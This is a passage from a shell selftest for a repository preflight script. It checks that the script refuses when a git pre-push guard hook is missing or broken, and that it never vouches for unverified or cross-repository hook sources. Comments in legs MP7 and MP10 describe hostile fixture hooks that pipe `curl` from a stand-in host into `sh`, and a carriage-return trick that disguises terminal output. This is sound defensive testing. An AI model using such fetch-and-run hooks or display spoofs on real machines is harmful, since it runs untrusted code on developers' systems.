  k11_mp() {  # <cwd> [preflight args…] -> the whole script's stdout+stderr, plus an `MP_RC=<rc>` trailer
    # The rc is captured with `|| _mprc=$?` rather than read after the fact: `set -e` is in force in this
    # shell and inherited by the subshell, so an un-`||`'d non-zero exit — which is the WHOLE POINT of
    # MP1/MP2/MP5 — would kill the subshell before the trailer, and the leg would read "no rc" instead of
    # "rc 1". Hermetic prefixes for the same reason k11_run carries them (a developer's global
    # core.hooksPath sends every fixture down the disclosed skip).
    ( cd "$1" 2>/dev/null || { printf 'MP_RC=cd-failed\n'; exit 0; }
      shift
      _mprc=0
      GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null \
        PREFLIGHT_GH_CMD='false' ACTIONLINT_VALID_CMD='__skip__' \
        sh "$K11_ROOT/scripts/preflight.sh" "$@" 2>&1 || _mprc=$?
      printf 'MP_RC=%s\n' "$_mprc" ) 2>&1
  }

  # MP1 — incepted + guard ABSENT, whole script from the fixture ROOT. The fresh-clone case the slice
  # exists for, driven end to end. Asserts the three things a direct call cannot: the call site is
  # reached, the refusal fires, and it exits 1 carrying a paste-able install command whose BOTH paths
  # are absolute (design §4.5 — a relative source is a broken paste from any subdirectory).
  d=$(k11_fx incepted none) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/MP1 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  _mpd=$( CDPATH='' cd -- "$d" 2>/dev/null && pwd -P ) || _mpd="$d"
  out=$(k11_mp "$d") || out="<k11_mp aborted>"
  rm -rf "$d" 2>/dev/null || true
  _mprc=${out##*MP_RC=}
  # Built as a variable, not inlined: the W3 measurement applies here too — an expansion inside double
  # quotes in a case pattern is LITERAL (so a glob metacharacter in the mktemp path cannot make this
  # vacuously true). Keep the quotes.
  # THE EXPECTED FORM IS WRITTEN OUT LITERALLY, not produced by calling guard_shq: a leg that builds its
  # expectation with the function under test asserts only that the function equals itself. A mktemp path
  # contains no apostrophe, so the literal single-quoted form is exact here.
  # `mkdir -p` is part of the expectation (finding Y7): scripts/incept.sh:964 performs it before the
  # identical `cp … && chmod +x`, and `.git/hooks` is not guaranteed to exist.
  _mpfix="mkdir -p '$_mpd/.git/hooks' && cp '$_mpd/hooks/pre-push' '$_mpd/.git/hooks/pre-push' && chmod +x '$_mpd/.git/hooks/pre-push'"
  case "$out" in
    *"ERROR: this repository's pre-push runtime guard is not in force"*"$_mpfix"*)
      if [ "$_mprc" = 1 ]; then
        echo "PASS: K11/MP1 a REAL run in an incepted tree with no guard REFUSES (exit 1) and prints the absolute, POSIX-quoted, paste-able install command"
      else
        echo "FAIL: K11/MP1 the refusal printed but the run did not exit 1 (rc=$_mprc) — the message is decorative ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/MP1 a real run in an incepted tree with NO guard did not refuse with the absolute install command (rc=$_mprc) ($out)"; fail=1 ;;
  esac
  # THE COMMAND IS OFFERED CONDITIONALLY ON THE HUMAN'S INSPECTION, NOT VOUCHED FOR (finding X1). The
  # kit cannot verify that an arbitrary file is its guard — the marker is a public substring — so the
  # refusal must hand the human the evidence (a digest) and say who the verifier is. Keyed on the CLAIM
  # (a sha256 line, and the explicit statement that nothing here verified it), not on the sentence.
  case "$out" in
    *"NOTHING HERE HAS VERIFIED IT"*"sha256:"*"If — and only if — that IS the kit's guard"*)
      echo "PASS: K11/MP1 the install command is offered as conditional on human inspection, with a sha256, and states that nothing here verified the source" ;;
    *) echo "FAIL: K11/MP1 the refusal offered an install command WITHOUT withdrawing the vouch and without a digest to verify against — the script is claiming a verification it cannot perform ($out)"; fail=1 ;;
  esac
  # Y2 — THE REFUSAL-PATH CEILING GETS ITS LOCK. Measured before this assertion existed: deleting the
  # six-line closing paragraph left the selftest at 126 PASS / 0 FAIL, because every other MP assertion
  # is `case "$out" in *A*B*)` where B is the fix line, and nothing after it was constrained. The plan
  # declares those lines load-bearing and this file's own rule is "a security fix with no leg is a
  # claim, not a control" — J5 locked the HAPPY-path caveat (P1); the REFUSAL path never got one.
  # Keyed on the three CLAIMS that make the caveat mean something (not a boundary · installing it does
  # not make main safe · --no-verify defeats it), so a reword survives and a deletion does not.
  case "$out" in
    *"not a boundary"*"does NOT make main"*"--no-verify"*)
      echo "PASS: K11/MP1 the refusal closes with the honest ceiling — not a boundary, does NOT make main safe, --no-verify skips it" ;;
    *) echo "FAIL: K11/MP1 the refusal printed a fix line with NO honest ceiling after it — a repaired guard would be read as protection the kit does not have ($out)"; fail=1 ;;
  esac

  # MP2 — incepted + guard present but NOT EXECUTABLE, whole script from the fixture ROOT. The inert
  # branch of design §4.5 shipped unproven end-to-end in the plan's own leg table (E1/A1/A2 covered
  # absent and the two silent classes and nothing else), and inert needs a DIFFERENT fix — chmod, not cp.
  # The negative half is load-bearing: a refusal block that printed the install command for every state
  # would satisfy an inert leg that only looked for "exit 1".
  d=$(k11_fx incepted inert) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/MP2 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  _mpd=$( CDPATH='' cd -- "$d" 2>/dev/null && pwd -P ) || _mpd="$d"
  out=$(k11_mp "$d") || out="<k11_mp aborted>"
  rm -rf "$d" 2>/dev/null || true
  _mprc=${out##*MP_RC=}
  _mpchmod="chmod +x '$_mpd/.git/hooks/pre-push'"
  case "$out" in
    *"cp '$_mpd/hooks/pre-push'"*)
      echo "FAIL: K11/MP2 an INERT guard was told to re-install (cp) instead of chmod — the two states are not discriminated in the refusal ($out)"; fail=1 ;;
    *"pre-push runtime guard is not in force"*"$_mpchmod"*)
      if [ "$_mprc" = 1 ]; then
        echo "PASS: K11/MP2 a REAL run with an inert (non-executable) guard REFUSES (exit 1) and names chmod +x, not a re-install"
      else
        echo "FAIL: K11/MP2 the inert refusal printed but the run did not exit 1 (rc=$_mprc) ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/MP2 a real run with an inert guard did not refuse naming chmod +x on the absolute path (rc=$_mprc) ($out)"; fail=1 ;;
  esac

  # MP4 BEFORE MP3, deliberately: this run is ALSO the ambient baseline MP3 differentials against. A
  # directory that is not a git repo at all has no hook, no obligation, and nothing for this check to
  # say — so whatever rc preflight returns here is the environment's answer, not ours.
  # MP4 — a bare (non-repo) directory: exit code unchanged from the ambient baseline, and SILENT.
  # INITIALIZED BEFORE THE RUN THAT SETS IT (finding J8): MP3 reads this variable and the two legs are
  # coupled across ~20 lines, so under `set -u` a future reordering (MP3 first) aborted the WHOLE
  # selftest with an unbound-variable error — no verdict line, which silences
  # conformance/adopter-preflight-wired.sh with it — instead of failing one leg. `unset` is a value MP3's
  # numeric comparison can never match, so a genuinely unset baseline FAILS MP3 loudly rather than
  # passing by accident. QUOTED because `unset` is also a shell builtin and the bare form trips
  # SC2209 ("use var=$(command) to assign output, or quote to assign string") — this is a string.
  _mpbase_rc='unset'
  _mpbare=$(mktemp -d) || _mpbare=""
  [ -n "$_mpbare" ] || { echo "FAIL: K11/MP4 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; _mpbare=$K11_NOFX; }
  out=$(k11_mp "$_mpbare") || out="<k11_mp aborted>"
  rm -rf "$_mpbare" 2>/dev/null || true
  _mpbase_rc=${out##*MP_RC=}
  # TWO CLAIMS, TWO LINES, because exactly one of them is always observable (finding J4). The SILENCE
  # claim holds in every environment. The EXIT-0 claim does not: if the ambient environment already
  # exits non-zero in a bare dir (no jq, say), it is unobservable here — and the previous single line
  # printed `PASS:` anyway, for a claim it had not tested, while MP3 then differentialled two
  # identically-broken codes against each other. A `PASS:` for an unobservable claim is precisely the
  # "a green attests the test RAN, never that the claim is true" pattern this kit gates against, so that
  # branch now says WEAK: — visible in the log, and honest about which of the two legs is load-bearing
  # in this environment. (It does not set `fail`: an ambient tool gap is not this check's defect. The
  # anti-wolf half above still fails hard.)
  case "$out" in
    *"Runtime guard:"*) echo "FAIL: K11/MP4 a real run CRIED WOLF about the guard in a directory that is not a git repo ($out)"; fail=1 ;;
    *) echo "PASS: K11/MP4 a real run in a bare non-repo directory is SILENT on the guard"
       if [ "$_mpbase_rc" = 0 ]; then
         echo "PASS: K11/MP4 a real run in a bare non-repo directory exits 0 (no obligation, no verdict)"
       else
         echo "WEAK: K11/MP4 the exit-0 half is NOT OBSERVABLE here — this environment already exits $_mpbase_rc in a bare directory for an ambient reason (a missing tool), so it is not asserted; MP3's differential against this baseline is correspondingly weak in this environment"
       fi ;;
  esac

  # MP3 — ANTI-WOLF, end to end. A kit-source tree has no guard obligation, so a real run must not print
  # the section and must not change its verdict. A1 asserts the same claim of the FUNCTION; MP3 asserts
  # it of the RUN, which is where an operator meets it. Design §6 records why neither can be found by a
  # mutation sweep — an over-broad predicate still fails whenever it should fail, so every mutant dies
  # and the sweep reports health. MP3/MP4 earn their place only as explicit fixtures.
  d=$(k11_fx kit-source none) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/MP3 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_mp "$d") || out="<k11_mp aborted>"
  rm -rf "$d" 2>/dev/null || true
  _mprc=${out##*MP_RC=}
  case "$out" in
    *"Runtime guard:"*) echo "FAIL: K11/MP3 a real run CRIED WOLF on a pre-inception kit-source tree — the gate doctor.sh:18 says is ignored within a month ($out)"; fail=1 ;;
    *) if [ "$_mprc" = "$_mpbase_rc" ]; then
         echo "PASS: K11/MP3 a real run in a kit-source tree prints no guard section and does not change the verdict (rc $_mprc = the no-obligation baseline)"
       else
         echo "FAIL: K11/MP3 a kit-source tree CHANGED the run's exit code (rc=$_mprc vs the no-obligation baseline $_mpbase_rc) — silent, but not harmless ($out)"; fail=1
       fi ;;
  esac

  # MP5 — from a SUBDIRECTORY under --allow-nested: the check STILL JUDGES, and offers NO COMMAND.
  #
  # THIS LEG'S SECOND HALF IS INVERTED FROM WHAT T2 SHIPPED, and the inversion is the finding.
  # T2 asserted that a subdirectory run under --allow-nested prints the paste-able install command with
  # both paths absolutized. The security review (X1) showed that command is the cross-repo attack: under
  # --allow-nested in a FOREIGN enclosing repo, the trusted kit's preflight was reproduced vouching for
  # THAT repo's hooks/pre-push — a genuine trust-boundary crossing, and `hooks/pre-push` carries no
  # CODEOWNERS rule, so it is PR-modifiable. NO SIGNAL distinguishes the benign monorepo-package case
  # from the hostile enclosing-repo case: both are exactly `--show-toplevel != $PWD`. The kit's rule for
  # that shape is fail-safe plus a signpost, so the command is withheld and the recovery is NAMED
  # ("re-run from the repo root"), which the operator of a real monorepo can act on in one step.
  #
  # THE FIRST HALF IS UNCHANGED AND STILL LOAD-BEARING: the check must still JUDGE here. Reaching it
  # from a subdirectory REQUIRES --allow-nested (CP-11 refuses first — measured 2026-07-21,
  # `git dir lives outside it`, rc 1 — and so would CP-4), and a LINKED WORKTREE trips CP-11 too
  # (measured: rc 1 without the flag, 0 with it), so --allow-nested is the ONLY way a real run reaches
  # this check from a worktree. Going silent would leave legs W1/W2/H3 — the whole worktree lane —
  # correct and unreachable in every real run. So: judge, refuse, exit 1 — but offer no command.
  # The two halves together are what make the leg discriminating: an implementation that always speaks
  # or one that never does fails one of them.
  d=$(k11_fx incepted none) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/MP5 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  _mpd=$( CDPATH='' cd -- "$d" 2>/dev/null && pwd -P ) || _mpd="$d"
  mkdir -p "$d/src/deep/nested" || true   # `|| true`: under the unbuildable sentinel this mkdir MUST
                                          # fail (ENOTDIR), and `set -e` would kill the run, not the leg
  out=$(k11_mp "$d/src/deep/nested" --allow-nested) || out="<k11_mp aborted>"
  rm -rf "$d" 2>/dev/null || true
  _mprc=${out##*MP_RC=}
  case "$out" in
    *"cp '$_mpd/hooks/pre-push'"*|*"cp \"$_mpd/hooks/pre-push\""*)
      echo "FAIL: K11/MP5 a run that is NOT at the root of its own repository was still handed an install command for the ENCLOSING repository's hooks/pre-push — the cross-repo vouch (X1) ($out)"; fail=1 ;;
    # THE SIGNPOST IS ANCHORED ON ITS DURABLE HALF, not on a whole sentence. The T3 form of this pattern
    # quoted "Re-run preflight from the root of the repository you own" verbatim, and finding W-1 — which
    # is purely a REWORDING of this arm, to stop telling a monorepo developer their own repo is not
    # theirs — turned it RED. A leg that reds on a wording change it does not care about teaches the next
    # author to edit the leg rather than think about it. The claim is "the refusal names the recovery",
    # so the anchor is the phrase that IS the recovery; the rest of the sentence is free to improve.
    *"pre-push runtime guard is not in force"*"NO INSTALL COMMAND IS OFFERED"*"Re-run preflight from"*)
      if [ "$_mprc" = 1 ]; then
        echo "PASS: K11/MP5 from a SUBDIRECTORY under --allow-nested the check still JUDGES and exits 1, but offers NO install command for a tree whose ownership was never asserted — and names the recovery"
      else
        echo "FAIL: K11/MP5 the nested refusal printed but the run did not exit 1 (rc=$_mprc) ($out)"; fail=1
      fi ;;
    *"Runtime guard:"*)
      echo "FAIL: K11/MP5 from a subdirectory the guard section printed but the refusal neither offered the command nor withheld it with the signposted reason ($out)"; fail=1 ;;
    *) echo "FAIL: K11/MP5 --allow-nested SILENCED the guard check from a subdirectory (rc=$_mprc) — the linked-worktree lane W1/W2/H3 lock would be unreachable in every real run ($out)"; fail=1 ;;
  esac

  # MP6 (T2 fix-loop, finding J1) — THE CALL SITE'S PLACEMENT, not just its existence.
  #
  # The placement was argued in 14 lines of comment at the call site and asserted by NOTHING. Measured
  # (2026-07-21, this tree): hoisting `check_guard_installed` above `if git_env_redirected` — mutant M-E
  # — left ALL of MP1..MP5 green and the selftest printing `OK: preflight selftest`, while a real run
  # from a subdirectory printed
  #     Runtime guard:
  #       MISS pre-push guard — not installed at <ENCLOSING-repo>/.git/hooks/pre-push
  # BEFORE the CP-11 refusal. That is a verdict about a repository the operator does not own, which is
  # the exact CP-4/CP-11 class the placement comment invokes — and this file's own rule applies to it:
  # "A security fix with no leg is a claim, not a control."
  #
  # SAME FIXTURE AS MP5, ONE FLAG DIFFERENT, and that is what makes the pair discriminating: MP5 proves
  # the check still JUDGES from a subdirectory under --allow-nested (the operator opted in), MP6 proves
  # it stays SILENT there WITHOUT the flag (the operator did not). A leg asserting only one of those is
  # satisfiable by a check that always speaks or one that never does.
  #
  # THE NEGATIVE HALF IS THE LOAD-BEARING HALF and it names BOTH surfaces, because the two live at
  # opposite ends of the script and a mutant can move either one: `Runtime guard:` is the section header
  # check_guard_installed prints, and `pre-push runtime guard is not in force` is the main-body refusal.
  # Asserting the CP-11 refusal alone would be green under M-E — M-E still refuses, it just talks about
  # someone else's repo first.
  d=$(k11_fx incepted none) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/MP6 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  mkdir -p "$d/src/deep/nested" || true   # `|| true` for the reason MP5/W3 carry it: under the
                                          # unbuildable sentinel this mkdir MUST fail (ENOTDIR), and
                                          # `set -e` would kill the run rather than the leg
  out=$(k11_mp "$d/src/deep/nested") || out="<k11_mp aborted>"   # NO --allow-nested — that is the leg
  rm -rf "$d" 2>/dev/null || true
  _mprc=${out##*MP_RC=}
  case "$out" in
    *"git dir lives outside it"*)
      if [ "$_mprc" = 1 ]; then
        echo "PASS: K11/MP6 from a nested dir WITHOUT --allow-nested the CP-11 refusal still fires and exits 1"
      else
        echo "FAIL: K11/MP6 the CP-11 refusal printed but the run did not exit 1 (rc=$_mprc) ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/MP6 a nested run without --allow-nested did not reach the CP-11 refusal at all (rc=$_mprc) — this leg's negative half below is then unanchored ($out)"; fail=1 ;;
  esac
  case "$out" in
    *"Runtime guard:"*)
      echo "FAIL: K11/MP6 the guard section printed BEFORE the CP-11 refusal — preflight passed judgment on a repository the operator does not own (the call site is upstream of the refusals; mutant M-E) ($out)"; fail=1 ;;
    *"pre-push runtime guard is not in force"*)
      echo "FAIL: K11/MP6 the K11 REFUSAL fired on a repository the operator does not own — the call site is upstream of the CP-11/CP-4 refusals ($out)"; fail=1 ;;
    *) echo "PASS: K11/MP6 nothing about the guard is said about a repo the operator does not own — the call site is DOWNSTREAM of the CP-11/CP-4 refusals (kills mutant M-E)" ;;
  esac

  # MP7 (T2 fix-loop, finding J2 — SECURITY) — the install command names a source it VERIFIES.
  #
  # The refusal's `absent` arm hands a human a paste-able `cp <src> <dst> && chmod +x <dst>`. Design §4.3
  # makes the KIT_GUARD_CORE marker the single definition of "the kit's hook" and the DESTINATION half is
  # judged by it — the SOURCE half was exempt. Measured before the fix (2026-07-21): a fixture whose
  # hooks/pre-push was `curl -s http://evil.invalid/ | sh` produced the full `cp … && chmod +x …`
  # instruction, with no caveat, telling a human to install an unverified script into .git/hooks/. In a
  # tree the operator did not author — and under --allow-nested, the ENCLOSING repo — that is the whole
  # attack. Every other leg was green.
  #
  # THE ASSERTION IS THE ABSENCE OF THE COMMAND, not the presence of a warning: a refusal that printed
  # both would still be pasted. It is anchored to the refusal having actually fired, because "no cp line"
  # is also what a check that says nothing at all emits.
  d=$(k11_fx incepted none-foreign-src) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/MP7 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  _mpd=$( CDPATH='' cd -- "$d" 2>/dev/null && pwd -P ) || _mpd="$d"
  out=$(k11_mp "$d") || out="<k11_mp aborted>"
  rm -rf "$d" 2>/dev/null || true
  _mprc=${out##*MP_RC=}
  # Double-quoted expansion in a case pattern is LITERAL — the W3 measurement; keep the quotes.
  case "$out" in
    *"cp \"$_mpd/hooks/pre-push\""*)
      echo "FAIL: K11/MP7 the refusal handed a human a paste-able 'cp' installing a source it never verified — that source does NOT carry KIT_GUARD_CORE ($out)"; fail=1 ;;
    *"pre-push runtime guard is not in force"*"$_mpd/hooks/pre-push"*)
      if [ "$_mprc" = 1 ]; then
        echo "PASS: K11/MP7 a hooks/pre-push that is NOT the kit's guard yields NO install command — it is named and refused, and the operator is sent to re-export (§4.3: KIT_GUARD_CORE is the only definition)"
      else
        echo "FAIL: K11/MP7 the unverified-source refusal printed but the run did not exit 1 (rc=$_mprc) ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/MP7 an unverified install source produced neither the refusal naming it nor a cp line (rc=$_mprc) — the leg cannot tell safe from silent ($out)"; fail=1 ;;
  esac

  # MP8 (T2 fix-loop, finding J2, cheap sibling) — the SOURCE MAY NOT EXIST AT ALL. An incepted tree that
  # lost hooks/pre-push got a `cp` against a path that is not there: a fix line that cannot work, which
  # teaches the reader the tool is wrong rather than that the tree is. Same KIT_GUARD_CORE predicate
  # answers this one for free (an unreadable/absent file carries no marker), so this leg costs one
  # fixture and pins that the two arms did not diverge.
  d=$(k11_fx incepted none-no-src) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/MP8 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  _mpd=$( CDPATH='' cd -- "$d" 2>/dev/null && pwd -P ) || _mpd="$d"
  out=$(k11_mp "$d") || out="<k11_mp aborted>"
  rm -rf "$d" 2>/dev/null || true
  _mprc=${out##*MP_RC=}
  case "$out" in
    *"cp \"$_mpd/hooks/pre-push\""*)
      echo "FAIL: K11/MP8 the refusal printed a 'cp' from a source that does not exist — a fix line that cannot work ($out)"; fail=1 ;;
    *"pre-push runtime guard is not in force"*"adopter-export.sh"*)
      if [ "$_mprc" = 1 ]; then
        echo "PASS: K11/MP8 a MISSING hooks/pre-push yields no cp line and points at re-export instead (mirrors incept.sh:977)"
      else
        echo "FAIL: K11/MP8 the missing-source refusal printed but the run did not exit 1 (rc=$_mprc) ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/MP8 a missing install source produced neither a re-export pointer nor a cp line (rc=$_mprc) ($out)"; fail=1 ;;
  esac

  # MP9 (T2 fix-loop, finding J3) — the UNREADABLE arm of the refusal, through the MAIN PATH. U1 locks
  # that the unreadable STATE is armed; nothing locked that the refusal block then names the right fix,
  # so a state whose fix line was wrong (or missing — the generic `*)` arm) shipped green. `chmod +r` is
  # the discriminating string: it is the only fix line no other state prints.
  # Same non-root condition U1 uses: chmod 000 is not a read barrier for uid 0.
  if [ "$(id -u)" = "0" ]; then
    echo "SKIP: K11/MP9 unreadable-hook main-path leg — running as uid 0, where chmod 000 is not a read barrier (ci.yml runs conformance-core as a non-root user, so CI does exercise it)"
  else
    d=$(k11_fx incepted unreadable) || d=""
    [ -n "$d" ] || { echo "FAIL: K11/MP9 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
    _mpd=$( CDPATH='' cd -- "$d" 2>/dev/null && pwd -P ) || _mpd="$d"
    out=$(k11_mp "$d") || out="<k11_mp aborted>"
    chmod 700 "$d/.git/hooks/pre-push" 2>/dev/null || true; rm -rf "$d" 2>/dev/null || true
    _mprc=${out##*MP_RC=}
    _mpchmodr="chmod +r '$_mpd/.git/hooks/pre-push'"
    case "$out" in
      *"cp '$_mpd/hooks/pre-push'"*)
        echo "FAIL: K11/MP9 an UNREADABLE guard was told to re-install (cp) — the state's own fix is the permission bit ($out)"; fail=1 ;;
      *"pre-push runtime guard is not in force"*"$_mpchmodr"*)
        if [ "$_mprc" = 1 ]; then
          echo "PASS: K11/MP9 a REAL run with an UNREADABLE guard REFUSES (exit 1) and names chmod +r on the absolute path"
        else
          echo "FAIL: K11/MP9 the unreadable refusal printed but the run did not exit 1 (rc=$_mprc) ($out)"; fail=1
        fi ;;
      *) echo "FAIL: K11/MP9 a real run with an unreadable guard did not refuse naming chmod +r on the absolute path (rc=$_mprc) ($out)"; fail=1 ;;
    esac
  fi

  # — MP10 / MP11 / Q1 / E4 (FINAL fix-loop): the security review's own attacks, as legs ——————
  # Every one of these was REPRODUCED against the T2 tree before it was written. They exist because
  # each blocker was a PARTIAL application of a rule this file already stated correctly, and the only
  # thing that distinguishes "applied everywhere" from "applied where someone looked" is a leg per
  # instance.

  # MP10 (finding X1) — A FORGED MARKER MUST NOT PRODUCE A VOUCH.
  # MP7's fixture omits KIT_GUARD_CORE, so MP7 models an attacker who did not try; it passed against a
  # `grep -q` substring test that any hostile hook can satisfy by writing the token in a COMMENT.
  # MEASURED against the T2 tree: a hooks/pre-push of `# KIT_GUARD_CORE` + `curl -s http://evil.invalid/x
  # | sh` received the full `Fix (a HUMAN must run this…)` + `cp … && chmod +x …`, with no caveat.
  # FOUR CLAIMS, because the fix has four parts and a leg per part is the point:
  #   (a) the vouching wording must be GONE — the script must state that it has verified nothing;
  #   (b) a DIGEST must be printed, because "you are the verifier" is empty without something to verify;
  #   (c) NO LINE OF THE SOURCE FILE MAY APPEAR IN THE OUTPUT AT ALL, and no CR may reach the terminal;
  #   (d) the human must be told HOW to inspect it (their own tools) and to RE-CHECK the digest.
  # CLAIM (c) REPLACES the T3 claim it is descended from, and the replacement is the finding. T3 asserted
  # that the 6-line preview "cannot impersonate a verdict", greping the OUTPUT BYTES for this check's own
  # happy-path line. That leg was green and the attack worked anyway (finding H-1): the preview's `tr`
  # range omitted CR, so a hostile line rendered its `    | ` prefix away and the preview READ as the
  # genuine kit guard, while the payload sat on line 7 below the window. A byte-grep cannot see a
  # RENDERING substitution — so the claim is no longer "the rendered content is inert" (undecidable from
  # a shell) but "there is no rendered content", which is decidable and is what the code now does.
  # THE ASSERTION IS DRIVEN FROM THE FIXTURE'S OWN BYTES, not from a hand-written list: every line of the
  # hostile file is read back and looked for in the output. A leg that enumerated the lines it expected
  # would be blind to the line it forgot, which is this slice's whole failure mode.
  d=$(k11_fx incepted none-forged-src) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/MP10 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  _mpd=$( CDPATH='' cd -- "$d" 2>/dev/null && pwd -P ) || _mpd="$d"
  out=$(k11_mp "$d") || out="<k11_mp aborted>"
  # Captured BEFORE the fixture is removed — claim (c) compares the output against the file's real bytes.
  _mp10src=$(cat "$d/hooks/pre-push" 2>/dev/null) || _mp10src=""
  rm -rf "$d" 2>/dev/null || true
  _mprc=${out##*MP_RC=}
  case "$out" in
    *"Fix (a HUMAN must run this"*"cp '$_mpd/hooks/pre-push'"*|*"Fix (a HUMAN must run this"*"cp \"$_mpd/hooks/pre-push\""*)
      echo "FAIL: K11/MP10 a hostile hooks/pre-push carrying KIT_GUARD_CORE in a COMMENT received a VOUCHED install command — the marker is a public substring and cannot verify anything ($out)"; fail=1 ;;
    *"NOTHING HERE HAS VERIFIED IT"*"sha256:"*"If — and only if — that IS the kit's guard"*)
      if [ "$_mprc" = 1 ]; then
        echo "PASS: K11/MP10 a forged KIT_GUARD_CORE marker yields no vouch — the refusal states that nothing verified the source, prints a sha256, and makes the command conditional on human inspection"
      else
        echo "FAIL: K11/MP10 the un-vouched wording printed but the run did not exit 1 (rc=$_mprc) ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/MP10 a forged-marker source produced neither a vouched command nor the human-verifier wording (rc=$_mprc) ($out)"; fail=1 ;;
  esac
  # (c) NO FILE CONTENT IS RENDERED. Driven from the fixture's own bytes: a here-doc (a redirection, not
  # a pipe) so the loop runs in THIS shell and `_mp10leak` survives it. `case … in *"$line"*` is a
  # LITERAL substring test — the value is quoted, so the CR and the shell metacharacters in the payload
  # are data, not pattern.
  _mp10leak=0; _mp10lines=0
  while IFS= read -r _mp10l || [ -n "$_mp10l" ]; do
    [ -n "$_mp10l" ] || continue
    _mp10lines=$(( _mp10lines + 1 ))
    case "$out" in *"$_mp10l"*) _mp10leak=$(( _mp10leak + 1 )) ;; esac
  done <<EOF
$_mp10src
EOF
  if [ "$_mp10lines" -lt 7 ]; then
    echo "FAIL: K11/MP10 the hostile fixture yielded only $_mp10lines readable lines — claim (c) is not asserting what it says (the fixture, not the code, is broken)"; fail=1
  elif [ "$_mp10leak" = 0 ]; then
    echo "PASS: K11/MP10 NO line of the attacker-controlled source appears in the refusal — all $_mp10lines lines checked, including the CR-spoof lines and the line-7 payload the old 6-line preview could never have shown"
  else
    echo "FAIL: K11/MP10 $_mp10leak of $_mp10lines lines of the hostile hook were RENDERED into the refusal — a security verdict must reference untrusted content, never display it ($out)"; fail=1
  fi
  # (c), second half: NO CARRIAGE RETURN may reach the terminal. This is the exact primitive H-1 used —
  # the bytes were innocent and the RENDERING was the substitution — so it gets its own assertion rather
  # than being folded into the line test, which a CR-free future attack would pass.
  _mp10cr=$(printf '%s' "$out" | LC_ALL=C tr -dc '\015' | wc -c | tr -d ' ') || _mp10cr=0
  if [ "${_mp10cr:-0}" = 0 ]; then
    echo "PASS: K11/MP10 the refusal emits no CARRIAGE RETURN — the byte that overwrote the preview's '    | ' prefix and made a hostile file render as the genuine guard cannot reach the terminal"
  else
    echo "FAIL: K11/MP10 the refusal emitted $_mp10cr carriage return(s) — a hostile line can overwrite this message's own prefixes and impersonate any line in it ($out)"; fail=1
  fi
  # (d) THE FRAMING SURVIVES THE DELETION. "You are the verifier" without an affordance is worse than
  # nothing, so the refusal must name the tools that CAN discriminate and must close the TOCTOU the
  # digest leaves open (the file can change between this print and the human's paste — un-closeable from
  # a shell script, which is why it is said out loud instead of pretended away).
  case "$out" in
    *"less '"*"git log -p -- hooks/pre-push"*"re-check"*)
      echo "PASS: K11/MP10 the refusal tells the human HOW to inspect the file with their own tools (less, git log -p) and to RE-CHECK the digest before pasting — the framing survives the excerpt's deletion" ;;
    *) echo "FAIL: K11/MP10 the refusal names no inspection affordance and/or no re-check prompt — 'YOU are the verifier' with nothing to verify with is the assurance-manufacturing this finding is about ($out)"; fail=1 ;;
  esac

  # MP11 (finding X1, the CROSS-REPO half) — the trust-boundary crossing, reproduced as a leg.
  # This is the case the security review measured and MP5 cannot reach: preflight run from a directory
  # inside an ENCLOSING repository whose hooks/pre-push is hostile. The kit's own trusted preflight
  # vouched for THAT repository's hook — and `hooks/pre-push` has no CODEOWNERS rule, so it is
  # PR-modifiable. MP5 uses a benign source, so a marker-only implementation passes MP5 and fails here:
  # the forged marker means the cheap filter says yes, and ONLY the ownership rule withholds the command.
  # That pairing is what makes this leg discriminating rather than a duplicate of MP5.
  d=$(k11_fx incepted none-forged-src) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/MP11 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  _mpd=$( CDPATH='' cd -- "$d" 2>/dev/null && pwd -P ) || _mpd="$d"
  mkdir -p "$d/vendored-package" || true   # `|| true` for the reason MP5/MP6/W3 carry it: under the
                                           # unbuildable sentinel this mkdir MUST fail (ENOTDIR)
  out=$(k11_mp "$d/vendored-package" --allow-nested) || out="<k11_mp aborted>"
  rm -rf "$d" 2>/dev/null || true
  _mprc=${out##*MP_RC=}
  case "$out" in
    *"cp '$_mpd/hooks/pre-push'"*|*"cp \"$_mpd/hooks/pre-push\""*)
      echo "FAIL: K11/MP11 CROSS-REPO VOUCH — run inside a directory owned by an ENCLOSING repository, preflight handed a human a command installing THAT repository's hooks/pre-push into .git/hooks/ ($out)"; fail=1 ;;
    *"NO INSTALL COMMAND IS OFFERED"*"ENCLOSING"*)
      if [ "$_mprc" = 1 ]; then
        echo "PASS: K11/MP11 a run inside an enclosing repository's tree gets NO install command — the source belongs to a repository whose ownership was never asserted, and the refusal says so"
      else
        echo "FAIL: K11/MP11 the cross-repo refusal printed but the run did not exit 1 (rc=$_mprc) ($out)"; fail=1
      fi ;;
